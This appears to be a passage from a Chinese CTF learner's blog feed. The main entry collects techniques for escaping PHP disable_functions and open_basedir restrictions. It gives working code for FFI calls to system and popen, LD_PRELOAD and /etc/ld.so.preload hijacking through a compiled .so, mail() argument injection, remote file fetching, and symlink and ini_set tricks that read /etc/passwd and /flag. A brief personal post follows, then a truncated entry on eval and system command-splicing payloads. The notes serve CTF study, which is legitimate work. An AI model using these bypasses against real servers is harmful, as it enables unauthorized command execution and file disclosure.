interface），提供了高级语言直接的互相调用，而对于PHP而言，FFI让我们可以方便的调用C语言写的各种库。</p><ul><li>PHP &gt;&#x3D; 7.4</li><li>开启了 FFI 扩展且<code>ffi.enable=true﻿</code></li></ul><p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions</p><div class="code-wrapper"><pre><code class="hljs clean">$ffi = FFI::cdef(<span class="hljs-string">&quot;int system(char* command);&quot;</span>);   # 声明C语言中的<span class="hljs-keyword">system</span>函数$ffi -&gt; <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);   # 执行ls /命令并将结果写入/tmp/res.txt</code></pre></div><p>C库的system函数调用shell命令，只能获取到shell命令的返回值，而不能获取shell命令的输出结果，如果想获取输出结果我们可以用popen函数来实现。popen()函数会调用fork()产生子进程，然后从子进程中调用 &#x2F;bin&#x2F;sh -c 来执行参数 command 的指令。</p><p>popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针使用C库的fgetc等函数来读取子进程的输出设备或是写入到子进程的标准输入设备中。</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);<span class="hljs-variable">$o</span> = <span class="hljs-variable">$ffi</span>-&gt;popen(<span class="hljs-string">&quot;ls /&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$c</span> = <span class="hljs-variable">$ffi</span>-&gt;fgetc(<span class="hljs-variable">$o</span>)) != -1)&#123;    <span class="hljs-variable">$d</span> .= str_pad(strval(dechex(<span class="hljs-variable">$c</span>)),2,<span class="hljs-string">&quot;0&quot;</span>,0);&#125;<span class="hljs-variable">$ffi</span>-&gt;pclose(<span class="hljs-variable">$o</span>);<span class="hljs-built_in">echo</span> hex2bin(<span class="hljs-variable">$d</span>);</code></pre></div><p>还可以利用FFI调用php源码，比如php_exec()函数就是php源码中的一个函数，当他参数type为3时对应着调用的是passthru()函数，其执行命令可以直接将结果原始输出</p><div class="code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ffi</span> = <span class="hljs-title class_">FFI</span>::cdef(<span class="hljs-string">&quot;int php_exec(int type, char *cmd);&quot;</span>);<span class="hljs-variable">$ffi</span> -&gt; php_exec(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;ls /&quot;</span>);</code></pre></div><h1 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h1><h4 id="蚁剑直接传"><a href="#蚁剑直接传" class="headerlink" title="蚁剑直接传"></a>蚁剑直接传</h4><p>要求fputs,fwrite函数不被禁用</p><h4 id="使用文件操作函数"><a href="#使用文件操作函数" class="headerlink" title="使用文件操作函数"></a>使用文件操作函数</h4><p>如使用base64配合fopen, fputs, fwrite, file_put_contents</p><div class="code-wrapper"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(<span class="hljs-string">&quot;a.php&quot;</span>,<span class="hljs-params">base64_decode</span>($<span class="hljs-params">_POST</span>[&#x27;<span class="hljs-params">a</span>&#x27;])</span>)</code></pre></div><p>原生类SplFileObject</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;http://网址/文件&quot;</span>);</code></pre></div><p>或base64编码后的结果</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=http://网址/文件&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;</code></pre></div><p>copy函数</p><div class="code-wrapper"><pre><code class="hljs applescript"><span class="hljs-keyword">copy</span>(<span class="hljs-string">&quot;http://网址/文件&quot;</span>, <span class="hljs-string">&quot;文件保存路径&quot;</span>);</code></pre></div><p>move_uploaded_file函数，POST上传文件即可</p><div class="code-wrapper"><pre><code class="hljs prolog">move_uploaded_file($<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], $<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);</code></pre></div><h4 id="FTP上传"><a href="#FTP上传" class="headerlink" title="FTP上传  **"></a>FTP上传  **</h4><p>server</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer<span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> FTPHandler<span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServerauthorizer = DummyAuthorizer()authorizer.add_anonymous(&quot;./&quot;)<span class="hljs-keyword">handler</span> = FTPHandler<span class="hljs-keyword">handler</span>.authorizer = authorizer<span class="hljs-keyword">handler</span>.masquerade_address = &quot;ip&quot;# 注意要用被动模式<span class="hljs-keyword">handler</span>.passive_ports = range(<span class="hljs-number">9998</span>,<span class="hljs-number">10000</span>)<span class="hljs-keyword">server</span> = FTPServer((&quot;0.0.0.0&quot;, <span class="hljs-number">23</span>), <span class="hljs-keyword">handler</span>)<span class="hljs-keyword">server</span>.serve_forever()</code></pre></div><p>client</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$local_file</span> = <span class="hljs-string">&#x27;/tmp/exp.so&#x27;</span>;<span class="hljs-variable">$server_file</span> = <span class="hljs-string">&#x27;exp.so&#x27;</span>;<span class="hljs-variable">$ftp_server</span> = <span class="hljs-string">&#x27;xxxxx&#x27;</span>;<span class="hljs-variable">$ftp_port</span>=<span class="hljs-number">23</span>;<span class="hljs-variable">$ftp</span> = <span class="hljs-title function_ invoke__">ftp_connect</span>(<span class="hljs-variable">$ftp_server</span>,<span class="hljs-variable">$ftp_port</span>);<span class="hljs-variable">$login_result</span> = <span class="hljs-title function_ invoke__">ftp_login</span>(<span class="hljs-variable">$ftp</span>, <span class="hljs-string">&#x27;anonymous&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-title function_ invoke__">ftp_pasv</span>(<span class="hljs-variable">$ftp</span>,<span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ftp_get</span>(<span class="hljs-variable">$ftp</span>, <span class="hljs-variable">$local_file</span>, <span class="hljs-variable">$server_file</span>, FTP_BINARY)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Successfully written to <span class="hljs-subst">$local_file</span>\n&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;There was a problem\n&quot;</span>;&#125;<span class="hljs-title function_ invoke__">ftp_close</span>(<span class="hljs-variable">$ftp</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h4 id="使用XML相关类写文件"><a href="#使用XML相关类写文件" class="headerlink" title="使用XML相关类写文件"></a>使用XML相关类写文件</h4><p>SimpleXMLElement</p><div class="code-wrapper"><pre><code class="hljs reasonml">$xml = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SimpleXMLElement([<span class="hljs-params">xml</span>-<span class="hljs-params">data</span>])</span>;$xml-&gt;<span class="hljs-keyword">as</span><span class="hljs-constructor">XML([<span class="hljs-params">filename</span>])</span>;</code></pre></div><p>DOMDocument</p><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-symbol">$d</span>=<span class="hljs-keyword">new</span> DOMDocument();<span class="hljs-symbol">$d</span>-&gt;loadHTML(<span class="hljs-string">&quot;[base64-data]&quot;</span>);<span class="hljs-symbol">$d</span>-&gt;saveHtmlFile(<span class="hljs-string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=[filename]&quot;</span>)</code></pre></div><h4 id="文件上传临时文件"><a href="#文件上传临时文件" class="headerlink" title="文件上传临时文件  ***"></a>文件上传临时文件  ***</h4><p>文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中，在上传存储到临时目录后，<strong>临时文件命名的规则如下</strong>: 默认为 php+4或者6位随机数字和大小写字母 <code>php[0-9A-Za-z]&#123;3,4,5,6&#125;</code>，上传完成则删除</p><p>这里可以使用用<strong>glob伪协议</strong>去锁定临时文件</p><div class="code-wrapper"><pre><code class="hljs awk">var_dump(scandir(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<span class="hljs-variable">$a</span>=scandir(<span class="hljs-string">&quot;glob:///tmp/php*&quot;</span>);<span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/tmp/&quot;</span>.<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>];var_dump(<span class="hljs-variable">$filename</span>);<span class="hljs-regexp">//</span>putenv(<span class="hljs-string">&quot;LD_PRELOAD=$filename&quot;</span>);<span class="hljs-regexp">//m</span>b_send_mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);</code></pre></div><p>如果向我们的一句话木马POST的话，当然也可以使用以下代码来获取临时文件名</p><div class="code-wrapper"><pre><code class="hljs prolog">$<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]</code></pre></div><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>如果第五个参数没有经过php_escape_shell_cmd处理，</p><p>可以使用mail(“”,””,””,””, ‘ -a ;ls &#x2F; &gt; &#x2F;tmp&#x2F;t.txt’);来进行命令执行，</p><p>如下</p><div class="code-wrapper"><pre><code class="hljs">#include &lt;stdio.h&gt;int main() &#123;    FILE *sendmail;    int ret;    char buf[128];        sendmail = popen(&quot;/usr/sbin/sendmail -t -i -a;ls / &gt; /tmp/ttt&quot;, &quot;w&quot;);    fprintf(sendmail, &quot;2&quot;);    while(fgets(buf, sizeof buf, sendmail)) &#123;        printf(&quot;%s&quot;, buf);    &#125;    ret = pclose(sendmail);    printf(&quot;%d&quot;, ret);    return 0;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LANG=zh_CN.GBK&quot;</span>);<span class="hljs-comment">//ini_set(&#x27;mail.force_extra_parameters&#x27;,&#x27; -a;echo 1 &gt; /tmp/t&#x27;);</span><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27; -a &#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0xbf</span>).<span class="hljs-string">&#x27;;ls / &gt; /tmp/t.txt&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>网上搜了一下，大概考点应该是disable_function绕过，网上给的脚本大多是先通过蚁剑连接再上传so文件进行绕过。但是查看了一下网站根目录，发现一个<code>.antproxy.php</code>,问了hurrison说是反制蚁剑连接的。</p><p>也就是说没办法蚁剑连接。查看权限，发现只有<code>/var/www/html</code> 是0755权限没有写文件权限，而其他路径都是0的权限，这道题势必要getshell执行系统命令才行了。</p><p>所以思路就是想办法上传文件，<strong>利用 LD_PRELOAD 环境变量</strong>来执行系统命令。</p><ul><li>执行<code>print_r(glob(&#39;/*&#39;));</code> 发现<code>/tmp</code>目录，进入里面还有其他选手留下的脚本（</li><li>所以思路是向<code>/tmp</code>目录下面写文件，利用文件包含getshell</li></ul><p>参考 <a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><p>原理：</p><blockquote><p>利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），新进程 a.bin 内部调用系统函数 b()，b() 位于 系统共享对象 c.so 中，所以系统为该进程加载共享对象 <a href="http://c.so/">c.so</a>，想办法在加载 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内的b() 而非系统的 <a href="http://c.so/">c.so</a> 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p></blockquote><p>想要利用LD_PRELOAD环境变量绕过disable_functions需要注意以下几点：</p><blockquote><p>能够上传自己的.so文件</p><p>能够控制LD_PRELOAD环境变量的值，比如putenv()函数</p><p>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</p></blockquote><h1 id="openbase-dir-（设置的是前缀）"><a href="#openbase-dir-（设置的是前缀）" class="headerlink" title="openbase_dir  （设置的是前缀）"></a>openbase_dir  （设置的是前缀）</h1><p>open_basedir 是php.ini 中的 一个配置选项。可以用作与 将用户访问文件的活动范围限制在指定的区域 ， 假设 open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp&#x2F; ， 那么通过 web 1 访问服务器的用户 就无法获取服务器上除了 &#x2F;var&#x2F;www&#x2F;html&#x2F;web1 和 &#x2F;tmp 这两个目录 以外 的文件。</p><p>注意： open_basedir 指定的限制实际上是前缀 而不是 目录名,</p><p>举个例子， 若“open_basedir” &#x3D; &#x2F;dir&#x2F;user 那么目录 &#x2F;dir&#x2F;user 和 &#x2F;dir&#x2F;user1 都是可以访问的。。</p><p>所以，如果要访问限制在仅为指定的目录，请用斜线结束路径名。例如 设置成：“open_basedir”</p><p>&#x3D;&#x2F;dir&#x2F;user&#x2F;</p><h1 id="bypass-openbase-dir"><a href="#bypass-openbase-dir" class="headerlink" title="bypass openbase_dir"></a>bypass openbase_dir</h1><h2 id="symlink-（软链接）"><a href="#symlink-（软链接）" class="headerlink" title="symlink()     （软链接）"></a>symlink()     （软链接）</h2><div class="code-wrapper"><pre><code class="hljs perl">&lt;?php<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;a&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;a&quot;</span>);<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;c&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;c&quot;</span>);<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;d&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;d&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-keyword">symlink</span>(<span class="hljs-string">&quot;a/b/c/d&quot;</span>,<span class="hljs-string">&quot;qwe&quot;</span>);<span class="hljs-keyword">symlink</span>(<span class="hljs-string">&quot;qwe/../../../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>);<span class="hljs-keyword">unlink</span>(<span class="hljs-string">&quot;qwe&quot;</span>);<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&quot;qwe&quot;</span>);?&gt;</code></pre></div><p>然后访问<code>127.0.0.1/exp</code>即可</p><p>创建一个链接文件qwe，用小队路径指向A&#x2F;B&#x2F;C&#x2F;D，再创建一个链接文件exp 指向 qwe&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd。 其实指向的就是A&#x2F;B&#x2F;C&#x2F;D&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，其实就是&#x2F;etc&#x2F;passwd. 这时候删除qwe再创一个qwe目录，但exp还是指向qwe&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd，所以就成功跨到&#x2F;etc&#x2F;passwd了。</p><h2 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob:&#x2F;&#x2F;"></a>DirectoryIterator+glob:&#x2F;&#x2F;</h2><p>DirectoryIterator是php的内置类，配合glob:&#x2F;&#x2F;能无视open_basedir的限制，读取根目录</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot;\n&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>但缺点是它们都只能列出根目录下和open_basedir指定的目录下的文件</p><h2 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir() + readdir()+glob:&#x2F;&#x2F;"></a>opendir() + readdir()+glob:&#x2F;&#x2F;</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>) ) &#123;    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    &#125;    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>与上面一样都只能列出根目录下和open_basedir指定的目录下的文件</p><h2 id="chdir-ini-set"><a href="#chdir-ini-set" class="headerlink" title="chdir() + ini_set()"></a>chdir() + ini_set()</h2><p>你只能在<code>open_basedir()</code>所限制的范围中选择更详细的范围来设置</p><p>但这时就出现一个问题，任何一个目录下都有<code>.</code> 和<code>..</code>这两个目录，通过 <code>ini_set(&#39;open_basedir&#39;, &#39;..&#39;)</code> 的设置，就可以全区允许访问 <code>..</code> 这个目录</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这种情况下通常disable_function只禁用了命令执行的函数，并且给出了eval（）</p><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-built_in">highlight_file</span>(__FILE__);<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]);</code></pre></div><p><img src="/../images/disable-function/image-20231102163700318.png" alt="image-20231102163700318"></p><p>首先肯定是有多种方法的，我们这里讲bypass open_basedir</p><p><img src="/../images/disable-function/image-20231102163759470.png" alt="image-20231102163759470"></p><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">mkdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">print_r</span>(scandir(&#x27;.&#x27;));</code></pre></div><p>要设置<code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;)</code>才能访问<code>/</code>目录下的文件</p><div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-built_in">mkdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;a&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">chdir</span>(&#x27;..&#x27;);<span class="hljs-built_in">ini_set</span>(&#x27;open_basedir&#x27;,&#x27;/&#x27;);<span class="hljs-built_in">readfile</span>(&#x27;/flag&#x27;);</code></pre></div><h1 id="etc-ld-so-preload-考察文件上传到-etc"><a href="#etc-ld-so-preload-考察文件上传到-etc" class="headerlink" title="&#x2F;etc&#x2F;ld.so.preload      (考察文件上传到&#x2F;etc)"></a>&#x2F;etc&#x2F;ld.so.preload      (考察文件上传到&#x2F;etc)</h1><p><strong>利用 &#x2F;etc&#x2F;ld.so.preload</strong></p><p>简单来说<code>/etc/ld.so.preload</code>是<code>LD_PRELOAD</code>的默认配置文件，所以跟LD_PRELOAD的优先级一样</p><blockquote><p>Linux 操作系统的动态链接库在加载过程中，动态链接器会先读取 LD_PRELOAD 环境变量和默认配置文件 <code>/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD 环境变量和 <code>/etc/ld.so.preload</code> 配置文件中指定的动态链接库依然会被装载，因为它们的优先级比 LD_LIBRARY_PATH 环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p></blockquote><div class="code-wrapper"><pre><code class="hljs routeros">file_check_res = subprocess.check_output([<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<span class="hljs-attribute">timeout</span>=1)</code></pre></div><p>查看 file 的源码 [<a href="https://github.com/file/file/blob/master/src/file.c">https://github.com/file/file/blob/master/src/file.c</a> </p><p>里面有个 <code>magic_version ()</code> 函数，没有任何参数，我们可以劫持这个函数</p><p>跟LD_PRELOAD差不多，比如说mail()，然后在源码中找函数进行劫持</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">magic_version</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-built_in">remove</span>(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>); <span class="hljs-comment">//without this, the exploit would recursively load .so</span>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs fortran">gcc <span class="hljs-built_in">exp</span>.c -o <span class="hljs-built_in">exp</span>.so -<span class="hljs-keyword">shared</span> -fPIC</code></pre></div><p>先上传so文件，然后<code>/etc/ld.so.preload</code>的内容为so文件的位置</p><p><img src="/../images/disable-function/image-20231123233111393.png" alt="image-20231123233111393"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>插曲</title>
    <link href="/2023/09/03/%E6%8F%92%E6%9B%B2/"/>
    <url>/2023/09/03/%E6%8F%92%E6%9B%B2/</url>
    
    <content type="html"><![CDATA[<p>前几天网站被发现了，Boogipop大佬找到tel✌来找人</p><p><img src="/2023/09/03/%E6%8F%92%E6%9B%B2/20230903175855.jpg"></p><p><img src="/2023/09/03/%E6%8F%92%E6%9B%B2/image-20230902172136084.png"></p><p>在烧卖有点社死（虽然我那时已经睡了，第二天看的信息），但被大佬关注到还是挺荣幸的</p><p>同时感觉学习更有动力、更有目标了（不知道这种状态能坚持多久）</p><p>在这期间还是多刷题吧，看完<code>Boogipop</code>的新人同学挺有收获，但是当脱离了文章，去回想学了什么时，只有一些模糊的记忆，还是通过刷题的印象更加深刻，更何况看到了大佬写的一堆<code>ctfshow</code>的题目</p><p>😁😁😁😁😁😁😁😀😀😀😀😀😀😀</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>读Boogipop新人同学</title>
    <link href="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/"/>
    <url>/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="读Boogipop大佬文章的具体尝试"><a href="#读Boogipop大佬文章的具体尝试" class="headerlink" title="读Boogipop大佬文章的具体尝试"></a>读Boogipop大佬文章的具体尝试</h1><h2 id="1-关于eval和system-（只尝试了php7-3-4）"><a href="#1-关于eval和system-（只尝试了php7-3-4）" class="headerlink" title="1.关于eval和system   （只尝试了php7.3.4）"></a>1.关于eval和system   （只尝试了php7.3.4）</h2><p>eval常规执行命令形如<code>eval(system(&#39;whoami&#39;););</code></p><p>当然不能直接这样运行，<code>system(&#39;whoami&#39;);</code>是传参进去的  （记得带<code>;</code>号）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#大佬给出的绕过技巧</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-meta">?&gt;</span>)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>;)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>;)</code></pre></div><h3 id="在拼接的情况下执行命令"><a href="#在拼接的情况下执行命令" class="headerlink" title="在拼接的情况下执行命令"></a>在拼接的情况下执行命令</h3><h4 id="eval-中的参数被拼接"><a href="#eval-中的参数被拼接" class="headerlink" title="eval()中的参数被拼接"></a>eval()中的参数被拼接</h4><div class="code-wrapper"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;asd&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>].<span class="hljs-string">&quot;asd&quot;</span>)<span class="hljs-comment">;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs mel">第一种: 注释考虑换行绕过      payload:?c=%0asystem(<span class="hljs-string">&#x27;ls&#x27;</span>);第二种: 考虑分割(; | &amp;)      payload:?c=;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);第三种: 考虑注释后面内容      payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//</span>                          payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);__HALT_COMPILER();</code></pre></div><h4 id="system-中的拼接"><a href="#system-中的拼接" class="headerlink" title="system()中的拼接"></a>system()中的拼接</h4><p>好像换行注释什么的都不行，只考虑命令拼接符</p><p>以下是个人尝试得出的结论，和网上的不同（有可能是windows环境的原因）(感觉我的都是歪理，其实有些地方也自相矛盾)</p><div class="code-wrapper"><pre><code class="hljs gherkin">;   理论上做题应该是万能的，但在本地尝试的时候,一点作用都没有|<span class="hljs-string">   只输出最后一个</span>|<span class="hljs-string">后的命令，若前面有一个命令是错误的，则无法执行</span><span class="hljs-string"></span>||<span class="hljs-string">  只执行</span>||<span class="hljs-string">前的命令，后面的命令错误不影响执行，若</span>||<span class="hljs-string">前的命令是错误的，后面的仍无法执行,     若前面的命令是curl、net(可能是没有输出结果的指令),就能够执行</span>||<span 